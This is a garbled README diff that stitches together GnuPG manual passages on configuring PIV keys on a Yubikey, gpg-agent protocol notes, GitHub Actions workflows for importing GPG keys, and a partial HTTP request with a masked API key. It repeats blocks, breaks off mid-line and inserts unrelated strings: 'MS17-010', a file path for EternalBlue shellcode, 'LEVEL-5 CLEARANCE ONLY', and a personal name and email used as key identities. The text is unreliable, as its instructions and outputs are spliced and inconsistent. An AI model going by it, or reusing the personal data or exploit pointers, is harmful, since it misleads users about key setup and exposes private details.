Proceed with creation? (y/N) y Now creating self-signed certificate. This may take a while ... gpgsm: about to sign the certificate for key: &32A6C6FAFCB8421878608AAB452D5470DD3223ED gpgsm: certificate created Ready. $ gpgsm --import sign.crt gpgsm: certificate imported gpgsm: total number processed: 1 gpgsm: imported: 1

‘gpgsm --learn’ Digital signature’ key gpg-card:

gpg/card> writecert PIV.9C < sign.crt

MS17-010

000006

Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: FF020001008A77C1 Application type .: PIV Version ..........: 1.0 Displayed s/n ....: yk-9074625 PIN usage policy .: app-pin PIN retry counter : - [verified] - PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E keyref .....: PIV.9A (auth) algorithm ..: nistp384 Card authenticat. : 7A53E6CFFE722

diff --git a/ReadMe.md b/ReadMe.md index 9f10a05..2888fcd 100644 --- a/ReadMe.md +++ b/ReadMe.md @@ -1,3 +1,1210 @@ +diff --git a/ReadMe.md b/ReadMe.md +index 7278f80..41b298d 100644 +--- a/ReadMe.md ++++ b/ReadMe.md +@@ -709,7 +709,844 @@ Digital signature’ key

gpg-card:
gpg/card> writecert PIV.9C < sign.crt ++# MS17-010 ++# 000006 ++Reader ...........: 1050:0407:X:0 ++Card type ........: yubikey ++Card firmware ....: 5.1.2 ++Serial number ....: FF020001008A77C1 ++Application type .: PIV ++Version ..........: 1.0 ++Displayed s/n ....: yk-9074625 ++PIN usage policy .: app-pin ++PIN retry counter : - [verified] - ++PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E ++ keyref .....: PIV.9A (auth) ++ algorithm ..: nistp384 ++Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C ++ keyref .....: PIV.9E (auth) ++ algorithm ..: nistp256 ++Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED ++ keyref .....: PIV.9C (sign,cert) ++ algorithm ..: rsa2048 ++ used for ...: X.509 ++ user id ..: CN=Signing key for yk-9074625,O=example,C=DE ++ user id ..: <6309304695z@gmail.co ++ m> ++Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB ++ keyref .....: PIV.9D (encr) ++ algorithm ..: rsa2048 ++ used for ...: X.509 ++ user id ..: CN=Encryption key for yk-9074625,O=example,C=DE ++ user id ..: 6309304695z@gmail.com ++ PIV authentication’ key with ssh: ++ ++$ ssh-add -l ++384 SHA256:0qnJ0Y0ehWxKcx2frLfEljf6GCdlO55OZed5HqGHsaU cardno:yk-9074625 (ECDSA) ++ssh-add with the uppercase ‘-L ++$ gpgsm --learn ++$ gpg --full-gen-key ++Please select what kind of key you want: ++ (1) RSA and RSA (default) ++ (2) DSA and Elgamal ++ (3) DSA (sign only) ++ (4) RSA (sign only) ++ (14) Existing key from card ++Your selection? 14 ++Serial number of the card: FF020001008A77C1 ++Available keys: ++ (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth) ++ (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth) ++ (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign) ++ (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr) ++Your selection? 3 ++Please specify how long the key should be valid. ++ 0 = key does not expire ++ = key expires in n days ++ w = key expires in n weeks ++ m = key expires in n months ++ y = key expires in n years ++Key is valid for? (0) ++Key does not expire at all ++Is this correct? (y/N) y ++ ++GnuPG needs to construct a user ID to identify your key. ++ ++Real name: keith bieszczat ++Email address: 6309304695z@gmail.com ++Comment: https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator ++You selected this USER-ID: ++ "6309304695z@gmail.com" ++ ++Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? o ++gpg: key C3AFA9ED971BB365 marked as ultimately trusted ++gpg: revocation certificate stored as '[...]D971BB365.rev' ++public and secret key created and signed. ++ ++Note that this key cannot be used for encryption. You may want to use ++the command "--edit-key" to generate a subkey for this purpose. ++pub rsa2048 2019-04-04 [SC] ++ 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365 ++uid 6309304695z@gmail.com ++ ++ run gpg in --expert mode ++ $ gpg --edit-key 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365 ++Secret key is available. ++ ++sec rsa2048/C3AFA9ED971BB365 ++ created: 2019-04-04 expires: never usage: SC ++ card-no: FF020001008A77C1 ++ trust: ultimate validity: ultimate ++[ultimate] (1). otto@example.net ++gpg> addkey ++Secret parts of primary key are stored on-card. ++Please select what kind of key you want: ++ (3) DSA (sign only) ++ (4) RSA (sign only) ++ (5) Elgamal (encrypt only) ++ (6) RSA (encrypt only) ++ (14) Existing key from card ++Your selection? 14 ++Serial number of the card: FF020001008A77C1 ++Available keys: ++ (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth) ++ (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth) ++ (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign) ++ (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr) ++Your selection? 4 ++Please specify how long the key should be valid. ++ 0 = key does not expire ++ = key expires in n days ++ w = key expires in n weeks ++ m = key expires in n months ++ y = key expires in n years ++Key is valid for? (0) ++Key does not expire at all ++Is this correct? (y/N) y ++Really create? (y/N) y ++ ++sec rsa2048/C3AFA9ED971BB365 ++ created: 2019-04-04 expires: never usage: SC ++ card-no: FF020001008A77C1 ++ trust: ultimate validity: ultimate ++ssb rsa2048/7067860A98FCE6E1 ++ created: 2019-04-04 expires: never usage: E ++ card-no: FF020001008A77C1 ++[ultimate] (1). otto@example.net ++ ++gpg> save ++ ++/* 32A19-D90712
++LEVEL-5 CLEARANCE ONLY ++ ‘--force’ ++authentication key ++-header-'010203040506070801020304050607080102030405060708' ++SETDATA hexstring ++to tell scdaemon about the data to be signed. The data must be given in hex notation. The actual signing is done using the command ++ ++ PKSIGN keyid ++where keyid is the hexified ID of the key to be used. The key id may have been retrieved using the command LEARN. If another hash algorithm than SHA-1 is used, that algorithm may be given like: ++ ++ PKSIGN --hash=algoname keyid ++READKEY hexified_certid ++READCERT hexified_certid|keyid ++SERIALNO ++Return the serial number of the card using a status response like: ++ ++ S SERIALNO D27600000000000000000000 ++ WRITEKEY [--force] keyid ++SETDATA hexstring ++to tell scdaemon about the data to be decrypted. The data must be given in hex notation. The actual decryption is then done using the command ++ ++ PKDECRYPT keyid ++CHECKPIN idstr ++RESTART ++APDU [--atr] [--more] [--exlen[=n]] [hexstring] ++S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1 ++ ++./configure --sysconfdir=/etc --localstatedir=/va ++CN=Wurzel ZS 3,O=Intevation GmbH,C=DE ++ A6935DD34EF3087973C706FC311AA2CCF733765B S ++ ++ # CN=PCA-1-Verwaltung-02/O=PKI-1-Verwaltung/C=DE ++ DC:BD:69:25:48:BD:BB:7E:31:6E:BB:80:D3:00:80:35:D4:F8:A6:CD S ++ ++ # CN=Root-CA/O=Schlapphuete/L=Pullach/C=DE ++ !14:56:98:D3:FE:9C:CA:5A:31:6E:BC:81:D3:11:4E:00:90:A3:44:C2 S ++
++ # Key added on: 2011-07-20 20:38:46 ++ # Fingerprint: 5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81 ++ 34B62F25E277CF13D3C6BCEBFD3F85D08F0A864B 0 confirm ++private-keys-v1.d/ ++gpg-connect-agent 'help COMMAND' /bye ++SETKEY ++Tell the server about the key to be used for decryption. If this is not used, gpg-agent may try to figure out the key by trying to decrypt the message with each key available. ++ ++ PKDECRYPT ++The agent checks whether this command is allowed and then does an INQUIRY to get the ciphertext the client should then send the cipher text. ++ ++ S: INQUIRE CIPHERTEXT ++ C: D (xxxxxx ++ C: D xxxx) ++ C: END ++Please note that the server may send status info lines while reading the data lines from the client. The data send is a SPKI like S-Exp with this structure: ++ ++ (enc-val ++ ( ++ (<param_name1> ) ++ ... ++ (<param_namen> ))) ++Where algo is a string with the name of the algorithm; see the libgcrypt documentation for a list of valid algorithms. The number and names of the parameters depend on the algorithm. The agent does return an error if there is an inconsistency. ++ ++If the decryption was successful the decrypted data is returned by means of "D" lines. ++ ++Here is an example session: ++ ++ C: PKDECRYPT ++ S: INQUIRE CIPHERTEXT ++ C: D (enc-val elg (a 349324324) ++ C: D (b 3F444677CA))) ++ C: END ++ S: # session key follows ++ S: S PADDING 0 ++ S: D (value 1234567890ABCDEF0) ++ S: OK decryption successful ++The “PADDING” status line is only send if gpg-agent can tell what kind of padding is used. As of now only the value 0 is used to indicate that the padding has ++SIGKEY ++This can be used multiple times to create multiple signature, the list of keys is reset with the next PKSIGN command or a RESET. The server tests whether the key is a valid key to sign something and responds with okay. ++ ++ SETHASH --hash=| ++sig-val ++ ( ++ (<param_name1> ) ++ ... ++ (<param_namen> ))) ++The operation is affected by the option ++ ++ OPTION use-cache-for-signing=0|1 ++The default of 1 uses the cache. Setting this option to 0 will lead gpg-agent to ignore the passphrase cache. Note, that there is also a global command line option for gpg-agent to globally disable the caching. ++ ++Here is an example session: ++ ++ C: SIGKEY ++ S: OK key available ++ C: SIGKEY ++ S: OK key available ++ C: PKSIGN ++ S: # I did ask the user whether he really wants to sign ++ S: # I did ask the user for the passphrase ++ S: INQUIRE HASHVAL ++ C: D ABCDEF012345678901234 ++ C: END ++ S: # signature follows ++ S: D (sig-val rsa (s 45435453654612121212)) ++ S: OK ++ GENKEY [--no-protection] [--preset] [<cache_nonce>] ++Invokes the key generation process and the server will then inquire on the generation parameters, like: ++ ++ S: INQUIRE KEYPARM ++ C: D (genkey (rsa (nbits 1024))) ++ C: END ++The format of the key parameters which depends on the algorithm is of the form: ++ ++ (genkey ++ (algo ++ (parameter_name_1 ....) ++ .... ++ (parameter_name_n ....))) ++If everything succeeds, the server returns the public key in a SPKI like S-Expression like this: ++ ++ (public-key ++ (rsa ++ (n ) ++ (e ))) ++Here is an example session: ++ ++ C: GENKEY ++ S: INQUIRE KEYPARM ++ C: D (genkey (rsa (nbits 1024))) ++ C: END ++ S: D (public-key ++ S: D (rsa (n 326487324683264) (e 10001))) ++ S OK key created ++ ISTRUSTED <5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81> ++LISTTRUSTED ++GpgAgent returns a list of trusted keys line by line: ++ ++ S: D 000000001234454556565656677878AF2F1ECCFF P ++ S: D 340387563485634856435645634856438576457A P ++ S: D FEDC6532453745367FD83474357495743757435D S ++ S: OK ++The first item on a line is the hexified fingerprint where MD5 fingerprints are 00 padded to the left and the second item is a flag to indicate the type of key (so that gpg is able to only take care of PGP keys). P = OpenPGP, S = S/MIME. A client should ignore the rest of the line, so that we can extend the format in the future. ++Ok ++Finally a client should be able to mark a key as trusted: ++ ++ MARKTRUSTED fingerprint "P"|"S" ++The server will then pop up a window to ask the user whether she really trusts this key. For this it will probably ask for a text to be displayed like this: ++ ++ S: INQUIRE TRUSTDESC ++ C: D Do you trust the key with the fingerprint @FPR@ ++ C: D bla fasel blurb. ++ C: END ++ S: OK ++GET_PASSPHRASE [--data] [--check] [--no-ask] [--repeat[=N]]
++ [--qualitybar] cache_id
++ [error_message prompt description] ++PRESET_PASSPHRASE [--inquire] <string_or_keygrip> [] ++ ++HAVEKEY keygrips ++ GET_CONFIRMATION description ++ LEARN [--send] ++UPDATESTARTUPTTY ++SETDATA hexstring ++ ++ ++ PKSIGN keyid ++ ++ ++ PKSIGN --hash=algoname keyid ++ ++READCERT hexified_certid|keyid ++READKEY hexified_certid ++SETDATA hexstring ++d ++ ++ PKSIGN keyid ++ LEARN ++ ++ PKSIGN --hash=algoname keyid ++ ++WRITEKEY [--force] keyid ++WRITEKEY [--force] keyid ++PASSWD [--reset] [--nullpin] chvno ++CHECKPIN idstr ++APDU [--atr] [--more] [--exlen[=n]] [hexstring] ++this: ++ ++ S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1 ++--auto-key-import ++ ++command --locate-external-key ++command --locate-external-key ++github/workflows/release.yml: ++ldap://keys.(thedomain) ++‘--auto-key-locate ++ --auto-key-locate ++--auto-key-retrieve ++ ++ ++ honor-keyserver-url ++ ++-sig-keyserver-url ++--recv-key ++honor-keyserver-url ++--use-agent ++--gpg-agent-info ++ ++ ++--no-random-seed-file ++Host: c7-use-3.algolianet. com ++Accept: / ++Sec-Fetch-Site: cross-site ++Accept-Language: en-US, en; q=0.9 ++Accept-Encoding: gzip, deflate, br ++Sec-Fetch-Mode: cors x-algolia-application-id: A7KCVJZ91B ++Origin: https://dashboard.algolia.com ++User-Agent: Mozilla/5.0 (iPhone; CPU iPhone 0S 17_3 like Mac 0S X) AppleWe ++x-algolia-api-key: b3cf***********************米** ++Content-Length: 27 ++Connection: keep-alive ++Content-Type: application/x-www-form-urlencoded ++Sec-Fetch-Dest: empty ++ ++scdaemon.conf ++1 ++HKCU\Software\GNU\GnuPG:DefaultLogFile, ++--debug-level level ++HKCU\Software\GNU\GnuPG:DefaultLogFile, ++scd-event ++HKCU\Software\GNU\GnuPG:HomeDir ++HKCU\Software\GNU\GnuPG:DefaultLogFile, ++reader_n.status ++HKCU\Software\GNU\GnuPG:HomeDir ++ ++trustlist.txt file ++gpg-agent.conf ++HKCU\Software\GNU\GnuPG:HomeDir ++name: release ++debug-pinentry ++--debug 1024 ++ ++global trustlist (/usr/local/etc/gnupg/trustlist.tx ++ ++Active cards ++Active cards (inserted into a card reader or plugged in tokens) are always tried; they are ordered by their serial numbers. ++gpg-connect-agent updatestartuptty /bye ++Although all GnuPG components try to start the gpg-agent as needed, this is not possible for the ssh support because ssh does not know about it. Thus if no GnuPG tool which accesses the agent has been run, there is no guarantee that ssh is able to use gpg-agent for authentication. To fix this you may start gpg-agent if needed using this simple command: ++ ++gpg-connect-agent /bye ++--scdaemon-program filename ++Use program filename as the Smartcard daemon. The default is installation dependent and can be shown with the gpgconf ++--check-passphrase-pattern file ++--check-sym-passphrase-pattern file ++Check the passphrase against the pattern given in file. When entering a new passphrase matching one of these pattern a warning will be displayed. If file does not contain any slashes and does not start with "~/" it is searched in the system configuration directory (/usr/local/etc/gnupg) ++bin\pinentry.exe, ..\Gpg4win\bin\pinentry.exe, ..\Gpg4win\pinentry.exe, ..\GNU\GnuPG\pinentry.exe, ..\GNU\bin\pinentry.exe, bin\pinentry-basic.exe ++Keys listed in the sshcontrol file ++--disable-extended-key-format ++These options are obsolete and have no effect. The extended key format is used for years now and has been supported since 2.1.12. Existing keys in the old format are migrated to the new format as soon as they are touched. ++ ++--enable-ssh-support ++--enable-win32-openssh-support ++--enable-putty-support ++ ++gpg-connect-agent 'GETINFO s2k_count' /bye ++gpg-connect-agent 'GETINFO s2k_time' /bye ++To view the auto-calibrated count use: ++ ++gpg-connect-agent 'GETINFO s2k_count_cal' /bye ++--ssh-fingerprint-digest ++Keys listed in the sshcontrol file ++ ++Active card ++gpg-connect-agent /bye ++bashrc or whatever initialization file is used for all shell invocations: ++ ++GPG_TTY=$(tty) ++export GPG_TTY ++--daemon [command line] ++server ++ ++agent-program file ¶ ++Specify the agent program to be started if none is running. The default value is determined by running gpgconf with the option --list-dirs. ++ ++--gpg-program file ++Specify a non-default gpg binary to be used by certain commands. ++ ++--gpgsm-program file ++Specify a non-default gpgsm binary to be used by certain commands. ++ ++--chuid uid ++Change the current user to uid which may either be a number or a name. This can be used from the root account to run gpg-card for another user. If uid is not the current UID a standard PATH is set and the envvar GNUPGHOME is unset. To override the latter the option --homedir can be used. This option has only an effect when used on the command line. This option has currently no effect at all on Windows. ++ ++gpg-card ++AUTHENTICATE [--setkey] [--raw] [< file]|010203040506070801020304050607080102030405060708] ¶ ++AUTH ++FETCH ++GENERATE [--force] [--algo=algo{+algo2}] keyref ++KDF-SETUP ¶ ++Prepare the OpenPGP card KDF feature for this card. ++ ++LANG [--clear] ++Change the language info for the card. This info can be used by applications for a personalized greeting. Up to 4 two-digit language identifiers can be entered as a preference. The option --clear removes all identifiers. GnuPG does not use this info. ++ ++LIST [--cards] [--apps] [--info] [--no-key-lookup] [n] [app] ++NAME [--clear] ++PRIVATEDO [--clear] n [< file] file ++READCERT [--openpgp] certref > file ¶ ++Read the certificate for key certref and store it in file. With option --openpgp an OpenPGP keyblock wrapped in a dedicated CMS content type (OID=1.3.6.1.4.1.11591.2.3.1) is expected and extracted to file. Note that for current OpenPGP cards a certificate may only be available at the certref "OPENPGP.3". ++URL [--clear] ++gpg's. --fetch ++WRITECERT certref < file ¶ ++WRITECERT --openpgp certref [< file|fpr] ++WRITECERT --clear certref ++ --openpgp ++file ++fpr. ++WRITEKEY [--force] keyref keygrip ¶ ++Write a private key object identified by keygrip to the card under the id keyref. ++CHECKKEYS [--ondisk] [--delete-clear-copy] [--delete-protected-copy] ¶ ++Serial number ++A hex-string with the serial number of the card. ++ ++Type ++This gives the type of the card’s application. For example "OpenPGP" or "PIV". ++ ++Keygrip ++A hex-string identifying a key. ++ ++Keyref ++The application slot where the key is stored on the card. For example "OpenPGP.1" ++ ++Status ++The status of the key. The most common value is "shadowed" for a key where only the public key along with the card’s serial number is stored on the disk. The value "clear" indicates that a copy of the card’s key is stored unprotected on disk. The value "protected" indicated that a copy of the car’s key is stored on disk but is protected by a password. The value "error" may also be shown if there was a problem reading information from the card. ++ ++YUBIKEY cmd args ++Various commands pertaining to Yubikey tokens with cmd being: ++ ++LIST ++List supported and enabled Yubikey applications. ++ ++ENABLE usb|nfc|all [otp|u2f|opgp|piv|oath|fido2|all] ++DISABLE ++Enable or disable the specified or all applications on the given interface. ++ ++The support for OpenPGP cards in gpg-card is not yet complete. For missing features, please continue to use gpg --card-edit. ++ ++GnuPG has support for PIV cards (“Personal Identity Verification” as specified by NIST Special Publication 800-73-4). This section describes how to initialize (personalize) a fresh Yubikey token featuring the PIV application (requires Yubikey-5). We assume that the credentials have not yet been changed and thus are: ++ ++Authentication key ++This is a 24 byte key described by the hex string ++010203040506070801020304050607080102030405060708. ++ ++PIV Application PIN ++This is the string 123456. ++ ++PIN Unblocking Key ++This is the string 12345678. ++list (the string gpg/card> ++card> list ++Reader ...........: 1050:0407:X:0 ++Card type ........: yubikey ++Card firmware ....: 5.1.2 ++Serial number ....: D2760001240102010006090746250000 ++Application type .: OpenPGP ++Version ..........: 2.1 ++[...] ++on: ++ push: ++ tags: ++ - "v" ++ ++permissions: ++ contents: write ++ ++jobs: ++ release: ++ runs-on: ubuntu-latest ++ steps: ++ - uses: actions/checkout@v3 ++ - uses: cli/gh-extension-precompile@v1 ++ with: ++ go_version: "1.16" ++Then ++- uses: cli/gh-extension-precompile@v1 ++ env: ++ CGO_ENABLED: 1 ++- uses: cli/gh-extension-precompile@v1 ++ with: ++ build_script_override: "script/build.sh" ++name: release ++ ++on: ++ push: ++ tags: ++ - "v" ++ ++permissions: ++ contents: write ++ ++jobs: ++ release: ++ runs-on: ubuntu-latest ++ steps: ++ - uses: actions/checkout@v3 ++ - id: import_gpg ++ uses: crazy-max/ghaction-import-gpg@v5 ++ with: ++ gpg_private_key: {{ secrets.GPG_PASSPHRASE }} ++ - uses: cli/gh-extension-precompile@v1 ++ with: ++ gpg_fingerprint: ${{ steps.import_gpg.outputs.fingerprint }} ++# macOS ++gpg --armor --export-secret-key joe@foo.bar | pbcopy ++ ++# Ubuntu (assuming GNU base64) ++gpg --armor --export-secret-key joe@foo.bar -w0 | xclip ++ ++# Arch ++gpg --armor --export-secret-key joe@foo.bar | xclip -selection clipboard -i ++ ++# FreeBSD (assuming BSD base64) ++gpg --armor --export-secret-key joe@foo.bar | xclip ++ ++name: import-gpg ++ ++on: ++ push: ++ branches: master ++ ++jobs: ++ import-gpg: ++ runs-on: ubuntu-latest ++ steps: ++ - ++ name: Checkout ++ uses: actions/checkout@v4 ++ - ++ name: Import GPG key ++ uses: crazy-max/ghaction-import-gpg@v6 ++ with: ++ gpg_private_key: {{ secrets.PASSPHRASE }} ++ - ++ name: List keys ++ run: gpg -K ++name: import-gpg ++ ++on: ++ push: ++ branches: master
++gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB ++gpg/card> writecert PIV.9D < encr.crt ++ ++jobs: ++ import-gpg: ++ runs-on: ubuntu-latest ++ steps: ++ - ++ name: Checkout ++ uses: actions/checkout@v4 ++ - ++ name: Import GPG key ++ uses: crazy-max/ghaction-import-gpg@v6 ++ with: ++ gpg_private_key: {{ secrets.PASSPHRASE }} ++ fingerprint: "C17D11ADF199F12A30A0910F1F80449BE0B08CB8" ++ - ++ name: List keys ++ run: gpg -K ++ ++pub ed25519 2021-09-24 [C] ++ 87F257B89CE462100BEC0FFE6071D218380FDCC8 ++ Keygrip = F5C3ABFAAB36B427FD98C4EDD0387E08EA1E8092 ++uid [ unknown] Joe Bar joe@bar.foo ++sub ed25519 2021-09-24 [S] ++ C17D11ADF199F12A30A0910F1F80449BE0B08CB8 ++ Keygrip = DEE0FC98F441519CA5DE5D79773CB29009695FEB ++name: import-gpg ++/.gnupg/scdaemon.conf and by restarting scdaemon, either by killing the process or by using gpgconf --kill scdaemon. Finally the default order in which card applications are tried by scdaemon can be changed. For example to prefer PIV over OpenPGP it is sufficient to add ++ ++application-priority piv ++to ~/.gnupg/scdaemon.conf and to restart scdaemon. This has an effect only on tokens which support both, PIV and OpenPGP, but does not hamper the use of OpenPGP only tokens. ++ ++With one of these methods employed the list command of gpg-card shows this: ++ ++gpg/card> list ++Reader ...........: 1050:0407:X:0 ++Card type ........: yubikey ++Card firmware ....: 5.1.2 ++Serial number ....: FF020001008A77C1 ++Application type .: PIV ++Version ..........: 1.0 ++Displayed s/n ....: yk-9074625 ++PIN usage policy .: app-pin ++PIN retry counter : - 3 - ++PIV authentication: [none] ++ keyref .....: PIV.9A ++Card authenticat. : [none] ++ keyref .....: PIV.9E ++Digital signature : [none] ++ keyref .....: PIV.9C ++Key management ...: [none] ++ keyref .....: PIV.9D ++34798AAFE0A7565088101CC4AE31C5C8C74461CB.key ++list --cards ++well. The PIV authentication key (internal reference PIV.9A ++Card authentication key (PIV.9E) is also known as the CAK and used to support physical access applications. The private key is not protected by a PIN and can thus immediately be used. The Digital signature key (PIV.9C) is used to digitally sign documents. The use of the associated private key is protected by the Application PIN which needs to be provided for each signing operation. The Key management key (PIV.9D) is used for encryption ++ ++gpg/card> auth 010203040506070801020304050607080102030405060708 ++gpg/card> auth < myauth.key ++ ++gpg/card> generate --algo=nistp384 PIV.9A ++PIV card no. yk-9074625 detected ++gpg/card> generate --algo=nistp256 PIV.9E ++PIV card no. yk-9074625 detected ++gpg/card> generate --algo=rsa2048 PIV.9C ++PIV card no. yk-9074625 detected ++ ‘--force’ ++gpg/card> list ++Reader ...........: 1050:0407:X:0 ++Card type ........: yubikey ++Card firmware ....: 5.1.2 ++Serial number ....: FF020001008A77C1 ++Application type .: PIV ++Version ..........: 1.0 ++Displayed s/n ....: yk-9074625 ++PIN usage policy .: app-pin ++PIN retry counter : - 3 - ++PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E ++ keyref .....: PIV.9A (auth) ++ algorithm ..: nistp384 ++Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C ++ keyref .....: PIV.9E (auth) ++ algorithm ..: nistp256 ++Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED ++ keyref .....: PIV.9C (sign,cert) ++ algorithm ..: rsa2048 ++Key management ...: [none] ++ keyref .....: PIV.9D ++keygrip ++gpg ++self-signed X.509 certificate (exit the gpg-card tool, first): ++ ++$ gpgsm --gen-key -o encr.crt ++ (1) RSA ++ (2) Existing key ++ (3) Existing key from card ++Your selection? 1 ++What keysize do you want? (3072) 2048 ++Requested keysize is 2048 bits ++Possible actions for a RSA key: ++ (1) sign, encrypt ++ (2) sign ++ (3) encrypt ++Your selection? 3 ++Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE ++Enter email addresses (end with an empty line): ++> otto@example.net ++> ++Enter DNS names (optional; end with an empty line): ++> ++Enter URIs (optional; end with an empty line): ++> ++Create self-signed certificate? (y/N) y ++These parameters are used: ++ Key-Type: RSA ++ Key-Length: 2048 ++ Key-Usage: encrypt ++ Serial: random ++ Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE ++ Name-Email: otto@example.net ++ ++Proceed with creation? (y/N) ++Now creating self-signed certificate. This may take a while ... ++gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB ++gpgsm: certificate created ++Ready. ++$ gpgsm --import encr.crt ++gpgsm: certificate imported ++gpgsm: total number processed: 1 ++gpgsm: imported: 1 ++gpg/card> list ++Reader ...........: 1050:0407:X:0 ++Card type ........: yubikey ++Card firmware ....: 5.1.2 ++Serial number ....: FF020001008A77C1 ++Application type .: PIV ++Version ..........: 1.0 ++Displayed s/n ....: yk-9074625 ++PIN usage policy .: app-pin ++PIN retry counter : - 3 - ++PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E ++ keyref .....: PIV.9A (auth) ++ algorithm ..: nistp384 ++Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C ++ keyref .....: PIV.9E (auth) ++ algorithm ..: nistp256 ++Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED ++ keyref .....: PIV.9C (sign,cert) ++ algorithm ..: rsa2048 ++Key management ...: [none] ++ keyref .....: PIV.9D ++keygrip ++gpgsm --gen-key -o encr.crt ++ (1) RSA ++ (2) Existing key ++ (3) Existing key from card ++Your selection? 1 ++What keysize do you want? (3072) 2048 ++Requested keysize is 2048 bits ++Possible actions for a RSA key: ++ (1) sign, encrypt ++ (2) sign ++ (3) encrypt ++Your selection? 3 ++Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE ++Enter email addresses (end with an empty line): ++> otto@example.net ++> ++Enter DNS names (optional; end with an empty line): ++> ++Enter URIs (optional; end with an empty line): ++> ++Create self-signed certificate? (y/N) y ++These parameters are used: ++ Key-Type: RSA ++ Key-Length: 2048 ++ Key-Usage: encrypt ++ Serial: random ++ Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE ++ Name-Email: otto@example.net ++ ++Proceed with creation? (y/N) ++Now creating self-signed certificate. This may take a while ... ++gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB ++gpgsm: certificate created ++Ready. ++$ gpgsm --import encr.crt ++gpgsm: certificate imported ++gpgsm: total number processed: 1 ++gpgsm: imported: 1 ++ ++gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB ++gpg/card> writecert PIV.9D < encr.crt ++ ++gpgsm --with-keygrip -k 6309304695z@gmail.com ++Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB ++ keyref .....: PIV.9D (encr) ++ algorithm ..: rsa2048 ++ used for ...: X.509 ++ user id ..: CN=Encryption key for yk-9074625,O=example,C=DE ++ user id ..: 6309304695z@gmail.com ++ ++34798AAFE0A7565088101CC4AE31C5C8C74461CB.key ++ ++$ gpgsm --learn ++$ gpgsm --gen-key -o sign.crt ++Please select what kind of key you want: ++ (1) RSA ++ (2) Existing key ++ (3) Existing key from card ++Your selection? 3 ++Serial number of the card: FF020001008A77C1 ++Available keys: ++ (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 ++ (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 ++ (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 ++ (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 ++Your selection? 3 ++Possible actions for a RSA key: ++ (1) sign, encrypt ++ (2) sign ++ (3) encrypt ++Your selection? 2 ++Enter the X.509 subject name: CN=Signing key for yk-9074625,O=example,C=DE ++Enter email addresses (end with an empty line): ++> 6309304695z@gmail.com ++> ++Enter DNS names (optional; end with an empty line): ++> ++Enter URIs (optional; end with an empty line): ++> ++Create self-signed certificate? (y/N) ++These parameters are used: ++ Key-Type: card:PIV.9C ++ Key-Length: 1024 ++ Key-Usage: sign ++ Serial: random ++ Name-DN: CN=Signing key for yk-9074625,O=example,C=DE ++ Name-Email: 6309304695z@gmail.com ++ ++Proceed with creation? (y/N) y ++Now creating self-signed certificate. This may take a while ... ++gpgsm: about to sign the certificate for key: &32A6C6FAFCB8421878608AAB452D5470DD3223ED ++gpgsm: certificate created ++Ready. ++$ gpgsm --import sign.crt ++gpgsm: certificate imported ++gpgsm: total number processed: 1 ++gpgsm: imported: 1 ++ ++‘gpgsm --learn’ ++Digital signature’ key ++gpg-card:010203040506070801020304050607080102030405060708 ++ ++shellcode/eternalblue_sc_merge.py ++ ++gpg/card> writecert PIV.9C < sign.crt

on:
push:
branches: master
